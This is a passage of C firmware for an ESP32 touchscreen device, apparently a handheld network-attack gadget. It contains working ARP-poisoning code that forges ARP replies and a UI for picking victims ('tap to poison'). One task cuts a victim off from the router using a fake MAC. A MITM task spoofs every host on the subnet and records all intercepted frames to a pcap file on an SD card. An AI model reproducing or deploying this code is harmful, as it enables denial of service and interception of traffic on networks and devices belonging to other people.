    lv_obj_add_event_cb(wifi_connect_next_btn, wifi_connect_next_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_add_flag(wifi_connect_next_btn, LV_OBJ_FLAG_HIDDEN);
}

// ============================================================================
// ARP Poisoning helpers
// ============================================================================

static void send_arp_reply(struct netif *lwip_netif,
                           const uint8_t *dst_mac,
                           const uint8_t *src_mac,
                           const uint8_t *sender_mac,
                           uint32_t sender_ip,
                           const uint8_t *target_mac,
                           uint32_t target_ip)
{
    uint8_t arp_packet[ARP_PACKET_SIZE];
    
    memcpy(&arp_packet[0], dst_mac, 6);
    memcpy(&arp_packet[6], src_mac, 6);
    arp_packet[12] = (ETH_TYPE_ARP >> 8) & 0xFF;
    arp_packet[13] = ETH_TYPE_ARP & 0xFF;
    
    arp_packet[14] = (ARP_HWTYPE_ETH >> 8) & 0xFF;
    arp_packet[15] = ARP_HWTYPE_ETH & 0xFF;
    arp_packet[16] = (ARP_PROTO_IP >> 8) & 0xFF;
    arp_packet[17] = ARP_PROTO_IP & 0xFF;
    arp_packet[18] = 6;
    arp_packet[19] = 4;
    arp_packet[20] = (ARP_OP_REPLY >> 8) & 0xFF;
    arp_packet[21] = ARP_OP_REPLY & 0xFF;
    
    memcpy(&arp_packet[22], sender_mac, 6);
    arp_packet[28] = sender_ip & 0xFF;
    arp_packet[29] = (sender_ip >> 8) & 0xFF;
    arp_packet[30] = (sender_ip >> 16) & 0xFF;
    arp_packet[31] = (sender_ip >> 24) & 0xFF;
    
    memcpy(&arp_packet[32], target_mac, 6);
    arp_packet[38] = target_ip & 0xFF;
    arp_packet[39] = (target_ip >> 8) & 0xFF;
    arp_packet[40] = (target_ip >> 16) & 0xFF;
    arp_packet[41] = (target_ip >> 24) & 0xFF;
    
    struct pbuf *p = pbuf_alloc(PBUF_RAW, ARP_PACKET_SIZE, PBUF_RAM);
    if (p != NULL) {
        memcpy(p->payload, arp_packet, ARP_PACKET_SIZE);
        lwip_netif->linkoutput(lwip_netif, p);
        pbuf_free(p);
    }
}

static void arp_ban_task(void *pvParameters)
{
    (void)pvParameters;
    
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        ESP_LOGE(TAG, "ARP ban: STA netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif || !lwip_netif->linkoutput) {
        ESP_LOGE(TAG, "ARP ban: LwIP netif not usable");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
    
    ESP_LOGI(TAG, "ARP ban: Poisoning both victim and router");
    
    while (arp_ban_active) {
        // To VICTIM: "gateway IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_target_mac, fake_mac, fake_mac,
                       arp_ban_gateway_ip.addr,
                       arp_ban_target_mac, arp_ban_target_ip.addr);
        
        vTaskDelay(pdMS_TO_TICKS(50));
        
        // To ROUTER: "victim IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_gateway_mac, fake_mac, fake_mac,
                       arp_ban_target_ip.addr,
                       arp_ban_gateway_mac, arp_ban_gateway_ip.addr);
        
        vTaskDelay(pdMS_TO_TICKS(450));
    }
    
    ESP_LOGI(TAG, "ARP ban task stopped");
    arp_ban_task_handle = NULL;
    vTaskDelete(NULL);
}

static void stop_arp_ban(void)
{
    if (!arp_ban_active && arp_ban_task_handle == NULL) return;
    arp_ban_active = false;
    for (int i = 0; i < 20 && arp_ban_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (arp_ban_task_handle != NULL) {
        vTaskDelete(arp_ban_task_handle);
        arp_ban_task_handle = NULL;
    }
}

static void arp_scan_task(void *pvParameters)
{
    (void)pvParameters;
    
    arp_host_count = 0;
    
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        ESP_LOGE(TAG, "ARP scan: STA netif not found");
        arp_scan_done = true;
        vTaskDelete(NULL);
        return;
    }
    
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK || ip_info.ip.addr == 0) {
        ESP_LOGE(TAG, "ARP scan: No IP assigned");
        arp_scan_done = true;
        vTaskDelete(NULL);
        return;
    }
    
    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif) {
        ESP_LOGE(TAG, "ARP scan: LwIP netif not found");
        arp_scan_done = true;
        vTaskDelete(NULL);
        return;
    }
    
    uint32_t ip = ntohl(ip_info.ip.addr);
    uint32_t mask = ntohl(ip_info.netmask.addr);
    uint32_t network = ip & mask;
    uint32_t broadcast = network | ~mask;
    
    int requests_sent = 0;
    for (uint32_t target = network + 1; target < broadcast && requests_sent < 254; target++) {
        ip4_addr_t target_ip;
        target_ip.addr = htonl(target);
        etharp_request(lwip_netif, &target_ip);
        requests_sent++;
        if (requests_sent % 10 == 0) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }
    
    ESP_LOGI(TAG, "ARP scan: Sent %d requests, waiting...", requests_sent);
    vTaskDelay(pdMS_TO_TICKS(3000));
    
    // Read ARP table
    for (int i = 0; i < ARP_TABLE_SIZE && arp_host_count < ARP_MAX_HOSTS; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            arp_hosts[arp_host_count].ip.addr = ip_ret->addr;
            memcpy(arp_hosts[arp_host_count].mac, eth_ret->addr, 6);
            arp_host_count++;
        }
    }
    
    ESP_LOGI(TAG, "ARP scan: Found %d hosts", arp_host_count);
    arp_scan_done = true;
    vTaskDelete(NULL);
}

static void arp_poison_exit_cb(lv_event_t *e)
{
    (void)e;
    stop_arp_ban();
    if (arp_poison_overlay) {
        lv_obj_del(arp_poison_overlay);
        arp_poison_overlay = NULL;
    }
    arp_poison_status_label = NULL;
    if (arp_scan_check_timer) {
        lv_timer_del(arp_scan_check_timer);
        arp_scan_check_timer = NULL;
    }
    nav_to_menu_flag = true;
}

static void arp_poison_popup_stop_cb(lv_event_t *e)
{
    (void)e;
    stop_arp_ban();
    if (arp_poison_overlay) {
        lv_obj_del(arp_poison_overlay);
        arp_poison_overlay = NULL;
    }
    arp_poison_status_label = NULL;
    nav_to_menu_flag = true;
}

static void arp_host_click_cb(lv_event_t *e)
{
    int index = (int)(intptr_t)lv_event_get_user_data(e);
    if (index < 0 || index >= arp_host_count) return;
    
    if (arp_ban_active) return;
    
    memcpy(arp_ban_target_mac, arp_hosts[index].mac, 6);
    arp_ban_target_ip.addr = arp_hosts[index].ip.addr;
    
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) return;
    
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(sta_netif, &ip_info);
    arp_ban_gateway_ip.addr = ip_info.gw.addr;
    
    bool gateway_found = false;
    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            if (ip_ret->addr == ip_info.gw.addr) {
                memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                gateway_found = true;
                break;
            }
        }
    }
    
    if (!gateway_found) {
        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
        if (lwip_netif) {
            ip4_addr_t gw_ip = { .addr = ip_info.gw.addr };
            etharp_request(lwip_netif, &gw_ip);
            vTaskDelay(pdMS_TO_TICKS(1000));
            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *ip_ret;
                struct netif *netif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == ip_info.gw.addr) {
                        memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                        gateway_found = true;
                        break;
                    }
                }
            }
        }
        if (!gateway_found) {
            ESP_LOGW(TAG, "Could not find gateway MAC");
            return;
        }
    }
    
    // Start ARP ban task
    arp_ban_active = true;
    BaseType_t result = xTaskCreate(arp_ban_task, "arp_ban", 4096, NULL, 5, &arp_ban_task_handle);
    if (result != pdPASS) {
        ESP_LOGE(TAG, "Failed to create ARP ban task");
        arp_ban_active = false;
        return;
    }
    
    // Show popup overlay with attack status and Stop button
    arp_poison_overlay = lv_obj_create(lv_scr_act());
    lv_obj_set_size(arp_poison_overlay, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(arp_poison_overlay, 0, 0);
    lv_obj_set_style_bg_color(arp_poison_overlay, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(arp_poison_overlay, LV_OPA_80, 0);
    lv_obj_set_style_border_width(arp_poison_overlay, 0, 0);
    lv_obj_clear_flag(arp_poison_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(arp_poison_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    lv_obj_t *dialog = lv_obj_create(arp_poison_overlay);
    lv_obj_set_size(dialog, 320, 200);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 15, 0);
    lv_obj_set_style_pad_gap(dialog, 8, 0);
    
    // Title
    lv_obj_t *title_lbl = lv_label_create(dialog);
    lv_label_set_text(title_lbl, LV_SYMBOL_WARNING " ARP Poisoning Active");
    lv_obj_set_style_text_color(title_lbl, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_font(title_lbl, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_align(title_lbl, LV_TEXT_ALIGN_CENTER, 0);
    
    // Target info
    char target_text[128];
    snprintf(target_text, sizeof(target_text),
             "Target: %d.%d.%d.%d\n%02X:%02X:%02X:%02X:%02X:%02X",
             ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
             ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip),
             arp_ban_target_mac[0], arp_ban_target_mac[1], arp_ban_target_mac[2],
             arp_ban_target_mac[3], arp_ban_target_mac[4], arp_ban_target_mac[5]);
    lv_obj_t *target_lbl = lv_label_create(dialog);
    lv_label_set_text(target_lbl, target_text);
    lv_obj_set_style_text_color(target_lbl, lv_color_make(220, 220, 220), 0);
    lv_obj_set_style_text_font(target_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_align(target_lbl, LV_TEXT_ALIGN_CENTER, 0);
    
    // Gateway info
    char gw_text[80];
    snprintf(gw_text, sizeof(gw_text), "Gateway: %d.%d.%d.%d",
             ip4_addr1(&arp_ban_gateway_ip), ip4_addr2(&arp_ban_gateway_ip),
             ip4_addr3(&arp_ban_gateway_ip), ip4_addr4(&arp_ban_gateway_ip));
    lv_obj_t *gw_lbl = lv_label_create(dialog);
    lv_label_set_text(gw_lbl, gw_text);
    lv_obj_set_style_text_color(gw_lbl, lv_color_make(150, 150, 150), 0);
    lv_obj_set_style_text_font(gw_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_align(gw_lbl, LV_TEXT_ALIGN_CENTER, 0);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(dialog);
    lv_obj_set_size(stop_btn, 140, 40);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_opa(stop_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_text_color(stop_btn, ui_text_color(), 0);
    lv_obj_set_style_border_width(stop_btn, 0, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
    lv_label_set_text(stop_lbl, "Stop & Exit");
    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_14, 0);
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(stop_btn, arp_poison_popup_stop_cb, LV_EVENT_CLICKED, NULL);
}

static void arp_poison_show_host_table(void)
{
    create_function_page_base("ARP Poison");
    
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_set_style_pad_all(content, 5, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Status / active poisoning label
    arp_poison_status_label = lv_label_create(content);
    char header[48];
    snprintf(header, sizeof(header), "Found %d hosts - tap to poison", arp_host_count);
    lv_label_set_text(arp_poison_status_label, header);
    lv_obj_set_style_text_color(arp_poison_status_label, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_text_font(arp_poison_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_align(arp_poison_status_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(arp_poison_status_label, lv_pct(100));
    
    // Scrollable host list
    lv_obj_t *host_list = lv_obj_create(content);
    lv_obj_set_size(host_list, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(host_list, 1);
    lv_obj_set_style_bg_color(host_list, lv_color_make(25, 25, 25), 0);
    lv_obj_set_style_border_color(host_list, lv_color_make(50, 50, 50), 0);
    lv_obj_set_style_border_width(host_list, 1, 0);
    lv_obj_set_style_radius(host_list, 8, 0);
    lv_obj_set_style_pad_all(host_list, 4, 0);
    lv_obj_set_flex_flow(host_list, LV_FLEX_FLOW_COLUMN);
    
    if (arp_host_count == 0) {
        lv_obj_t *empty_lbl = lv_label_create(host_list);
        lv_label_set_text(empty_lbl, "No hosts found");
        lv_obj_set_style_text_color(empty_lbl, lv_color_make(150, 150, 150), 0);
        lv_obj_set_style_text_font(empty_lbl, &lv_font_montserrat_14, 0);
    } else {
        for (int i = 0; i < arp_host_count; i++) {
            lv_obj_t *row = lv_btn_create(host_list);
            lv_obj_set_size(row, lv_pct(100), 40);
            lv_obj_set_style_bg_color(row, lv_color_make(35, 35, 35), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_opa(row, LV_OPA_COVER, LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
            lv_obj_set_style_text_color(row, lv_color_make(220, 220, 220), 0);
            lv_obj_set_style_border_width(row, 0, 0);
            lv_obj_set_style_radius(row, 6, 0);
            lv_obj_set_style_pad_all(row, 4, 0);
            
            char row_text[64];
            snprintf(row_text, sizeof(row_text), "%d.%d.%d.%d  %02X:%02X:%02X:%02X:%02X:%02X",
                     ip4_addr1(&arp_hosts[i].ip), ip4_addr2(&arp_hosts[i].ip),
                     ip4_addr3(&arp_hosts[i].ip), ip4_addr4(&arp_hosts[i].ip),
                     arp_hosts[i].mac[0], arp_hosts[i].mac[1], arp_hosts[i].mac[2],
                     arp_hosts[i].mac[3], arp_hosts[i].mac[4], arp_hosts[i].mac[5]);
            
            lv_obj_t *row_lbl = lv_label_create(row);
            lv_label_set_text(row_lbl, row_text);
            lv_obj_set_style_text_color(row_lbl, lv_color_make(220, 220, 220), 0);
            lv_obj_set_style_text_font(row_lbl, &lv_font_montserrat_12, 0);
            lv_obj_center(row_lbl);
            
            lv_obj_add_event_cb(row, arp_host_click_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
        }
    }
    
    // Back button (returns to menu without starting attack)
    lv_obj_t *exit_btn = lv_btn_create(content);
    lv_obj_set_size(exit_btn, 120, 36);
    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_opa(exit_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_text_color(exit_btn, ui_text_color(), 0);
    lv_obj_set_style_border_width(exit_btn, 0, 0);
    lv_obj_set_style_radius(exit_btn, 8, 0);
    lv_obj_t *exit_lbl = lv_label_create(exit_btn);
    lv_label_set_text(exit_lbl, "Back");
    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_14, 0);
    lv_obj_center(exit_lbl);
    lv_obj_add_event_cb(exit_btn, arp_poison_exit_cb, LV_EVENT_CLICKED, NULL);
}

static void arp_scan_check_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    if (arp_scan_done) {
        arp_scan_done = false;
        if (arp_scan_check_timer) {
            lv_timer_del(arp_scan_check_timer);
            arp_scan_check_timer = NULL;
        }
        arp_poison_show_host_table();
    }
}

static void show_arp_poison_page(void)
{
    create_function_page_base("ARP Poison");
    
    // Show scanning overlay
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *spinner = lv_spinner_create(content, 1000, 60);
    lv_obj_set_size(spinner, 50, 50);
    lv_obj_align(spinner, LV_ALIGN_CENTER, 0, -20);
    
    lv_obj_t *scan_label = lv_label_create(content);
    lv_label_set_text(scan_label, "Scanning network for hosts...");
    lv_obj_set_style_text_color(scan_label, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_text_font(scan_label, &lv_font_montserrat_16, 0);
    lv_obj_align(scan_label, LV_ALIGN_CENTER, 0, 30);
    
    // Start ARP scan task
    arp_scan_done = false;
    xTaskCreate(arp_scan_task, "arp_scan", 4096, NULL, 5, NULL);
    
    // Start timer to check when scan is done
    arp_scan_check_timer = lv_timer_create(arp_scan_check_timer_cb, 200, NULL);
}

// ============================================================================
// MITM Capture (ARP spoof all hosts + LwIP packet capture to SD)
// ============================================================================

static void sd_sync(void) {
    int fd = open("/sdcard/.sync", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        fsync(fd);
        close(fd);
        unlink("/sdcard/.sync");
    }
}

static void mitm_classify_frame(const uint8_t *data, uint16_t len)
{
    if (len < 14) { mitm_other_proto_count++; return; }
    uint16_t ethertype = ((uint16_t)data[12] << 8) | data[13];
    if (ethertype == 0x0806) {
        mitm_arp_pkt_count++;
    } else if (ethertype == 0x0800 && len >= 24) {
        uint8_t ip_proto = data[23];
        if (ip_proto == 6)       mitm_tcp_count++;
        else if (ip_proto == 17) mitm_udp_count++;
        else if (ip_proto == 1)  mitm_icmp_count++;
        else                     mitm_other_proto_count++;
    } else {
        mitm_other_proto_count++;
    }
}

static void mitm_enqueue_frame(const uint8_t *data, uint16_t len)
{
    static uint32_t enqueue_count = 0;
    if (!mitm_capture_active || !mitm_packet_queue || len == 0) return;

    mitm_queued_frame_t *frame = heap_caps_malloc(sizeof(mitm_queued_frame_t) + len, MALLOC_CAP_SPIRAM);
    if (!frame) {
        mitm_drop_count++;
        return;
    }

    frame->len = len;
    frame->timestamp_us = esp_timer_get_time();
    memcpy(frame->data, data, len);

    if (xQueueSend(mitm_packet_queue, &frame, 0) != pdTRUE) {
        heap_caps_free(frame);
        mitm_drop_count++;
    } else {
        mitm_classify_frame(data, len);
        enqueue_count++;
        if (enqueue_count <= 5 || enqueue_count % 50 == 0) {
            ESP_LOGI(TAG, "MITM enqueue: #%lu len=%d qfree=%d",
                     (unsigned long)enqueue_count, len,
                     (int)uxQueueSpacesAvailable(mitm_packet_queue));
        }
    }
}

static err_t mitm_netif_input_hook(struct pbuf *p, struct netif *inp)
{
    if (mitm_capture_active && p && p->tot_len > 0 && p->tot_len <= MITM_MAX_FRAME) {
        uint8_t tmp[MITM_MAX_FRAME];
        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
        if (copied > 0) {
            mitm_enqueue_frame(tmp, copied);
        }
    }
    return mitm_original_input(p, inp);
}

static err_t mitm_netif_linkoutput_hook(struct netif *netif, struct pbuf *p)
{
    if (mitm_capture_active && p && p->tot_len > 0 && p->tot_len <= MITM_MAX_FRAME) {
        uint8_t tmp[MITM_MAX_FRAME];
        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
        if (copied > 0) {
            mitm_enqueue_frame(tmp, copied);
        }
    }
    return mitm_original_linkoutput(netif, p);
}

static void mitm_arp_spoof_task(void *pvParameters)
{
    (void)pvParameters;

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        ESP_LOGE(TAG, "MITM ARP: STA netif not found");
        mitm_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif || !lwip_netif->linkoutput) {
        ESP_LOGE(TAG, "MITM ARP: LwIP netif not usable");
        mitm_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "MITM ARP: Spoofing %d hosts", mitm_host_count);

    while (mitm_arp_active) {
        for (int i = 0; i < mitm_host_count && mitm_arp_active; i++) {
            // Tell victim: "gateway IP is at our MAC"
            send_arp_reply(lwip_netif,
                           mitm_hosts[i].mac, mitm_own_mac, mitm_own_mac,
                           mitm_gateway_ip,
                           mitm_hosts[i].mac, mitm_hosts[i].ip.addr);
            // Tell gateway: "victim IP is at our MAC"
            send_arp_reply(lwip_netif,
                           mitm_gateway_mac, mitm_own_mac, mitm_own_mac,
                           mitm_hosts[i].ip.addr,
                           mitm_gateway_mac, mitm_gateway_ip);

            vTaskDelay(pdMS_TO_TICKS(10));
        }
        vTaskDelay(pdMS_TO_TICKS(2000));
    }

    // Restore original ARP mappings (3 passes)
    ESP_LOGI(TAG, "MITM ARP: Sending corrective ARP to restore network...");
    for (int pass = 0; pass < 3; pass++) {
        for (int i = 0; i < mitm_host_count; i++) {
            send_arp_reply(lwip_netif,
                           mitm_hosts[i].mac, mitm_gateway_mac, mitm_gateway_mac,
                           mitm_gateway_ip,
                           mitm_hosts[i].mac, mitm_hosts[i].ip.addr);
            send_arp_reply(lwip_netif,
                           mitm_gateway_mac, mitm_hosts[i].mac, mitm_hosts[i].mac,
                           mitm_hosts[i].ip.addr,
                           mitm_gateway_mac, mitm_gateway_ip);
        }
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    ESP_LOGI(TAG, "MITM ARP: spoof task stopped");
    mitm_arp_task_handle = NULL;
    vTaskDelete(NULL);
}

static void mitm_pcap_writer_task(void *pvParameters)
{
    (void)pvParameters;

    ESP_LOGI(TAG, "MITM writer: started, file=%s", mitm_pcap_filepath);

    mitm_queued_frame_t *frame = NULL;
    uint32_t flush_counter = 0;

    while (mitm_capture_active) {
        if (xQueueReceive(mitm_packet_queue, &frame, pdMS_TO_TICKS(200)) != pdTRUE)
            continue;

        if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);

        do {
            pcap_record_header_t rec = {
                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
                .incl_len = frame->len,
                .orig_len = frame->len
            };
            fwrite(&rec, 1, sizeof(rec), mitm_pcap_file);
            fwrite(frame->data, 1, frame->len, mitm_pcap_file);
            heap_caps_free(frame);
            mitm_frame_count++;
            flush_counter++;
        } while (xQueueReceive(mitm_packet_queue, &frame, 0) == pdTRUE);

        if (flush_counter >= 50) {
            fflush(mitm_pcap_file);
            flush_counter = 0;
        }

        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
    }

    // Drain remaining queue
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
        while (xQueueReceive(mitm_packet_queue, &frame, 0) == pdTRUE) {
            pcap_record_header_t rec = {
                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
                .incl_len = frame->len,
                .orig_len = frame->len
            };
            fwrite(&rec, 1, sizeof(rec), mitm_pcap_file);
            fwrite(frame->data, 1, frame->len, mitm_pcap_file);
            heap_caps_free(frame);
            mitm_frame_count++;
        }
        if (mitm_pcap_file) {
            fflush(mitm_pcap_file);
            fclose(mitm_pcap_file);
            mitm_pcap_file = NULL;
            sd_sync();
        }
        xSemaphoreGive(sd_spi_mutex);
    } else {
        // Cannot get mutex (held by display/stop caller) -- free frames only;
        // mitm_stop() will close the file.
        while (xQueueReceive(mitm_packet_queue, &frame, 0) == pdTRUE) {
            heap_caps_free(frame);
        }
    }

    ESP_LOGI(TAG, "MITM writer: stopped, %lu frames written, %lu dropped",
             (unsigned long)mitm_frame_count, (unsigned long)mitm_drop_count);
    mitm_writer_task_handle = NULL;
    vTaskDelete(NULL);
}

static void mitm_scan_task(void *pvParameters)
{
    (void)pvParameters;
    mitm_host_count = 0;

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        ESP_LOGE(TAG, "MITM scan: STA netif not found");
        mitm_scan_done = true;
        vTaskDelete(NULL);
        return;
    }

    esp_netif_ip_info_t ip_info;
    bool got_ip = false;
    for (int attempt = 0; attempt < 20; attempt++) {
        if (esp_netif_get_ip_info(sta_netif, &ip_info) == ESP_OK && ip_info.ip.addr != 0) {
            got_ip = true;
            break;
        }
        ESP_LOGI(TAG, "MITM scan: waiting for DHCP... (%d/20)", attempt + 1);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (!got_ip) {
        ESP_LOGE(TAG, "MITM scan: No IP assigned after 10s");
        mitm_scan_done = true;
        vTaskDelete(NULL);
        return;
    }

    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif) {
        ESP_LOGE(TAG, "MITM scan: LwIP netif not found");
        mitm_scan_done = true;
        vTaskDelete(NULL);
        return;
    }

    // Get own MAC and gateway info
    esp_wifi_get_mac(WIFI_IF_STA, mitm_own_mac);
    mitm_gateway_ip = ip_info.gw.addr;

    // Resolve gateway MAC from ARP table or by sending request
    bool gw_found = false;
    ip4_addr_t gw_ip;
    gw_ip.addr = mitm_gateway_ip;
    etharp_request(lwip_netif, &gw_ip);
    vTaskDelay(pdMS_TO_TICKS(1000));

    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            if (ip_ret->addr == mitm_gateway_ip) {
                memcpy(mitm_gateway_mac, eth_ret->addr, 6);
                gw_found = true;
                break;
            }
        }
    }

    if (!gw_found) {
        ESP_LOGW(TAG, "MITM scan: Gateway MAC not found, retrying...");
        etharp_request(lwip_netif, &gw_ip);
        vTaskDelay(pdMS_TO_TICKS(2000));
        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ip_ret;
            struct netif *netif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                if (ip_ret->addr == mitm_gateway_ip) {
                    memcpy(mitm_gateway_mac, eth_ret->addr, 6);
                    gw_found = true;
                    break;
                }
            }
        }
    }

    if (!gw_found) {
        ESP_LOGE(TAG, "MITM scan: Could not resolve gateway MAC");
        mitm_scan_done = true;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "MITM scan: Gateway MAC=%02X:%02X:%02X:%02X:%02X:%02X",
             mitm_gateway_mac[0], mitm_gateway_mac[1], mitm_gateway_mac[2],
             mitm_gateway_mac[3], mitm_gateway_mac[4], mitm_gateway_mac[5]);

    // Scan subnet
    uint32_t ip = ntohl(ip_info.ip.addr);
    uint32_t mask = ntohl(ip_info.netmask.addr);
    uint32_t network = ip & mask;
    uint32_t broadcast = network | ~mask;

    int requests_sent = 0;
    for (uint32_t target = network + 1; target < broadcast && requests_sent < 254; target++) {
        ip4_addr_t target_ip;
        target_ip.addr = htonl(target);
        etharp_request(lwip_netif, &target_ip);
        requests_sent++;
        if (requests_sent % 10 == 0) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    ESP_LOGI(TAG, "MITM scan: Sent %d ARP requests, waiting...", requests_sent);
    vTaskDelay(pdMS_TO_TICKS(3000));

    // Read ARP table for discovered hosts (excluding gateway and ourselves)
    if (!mitm_hosts) {
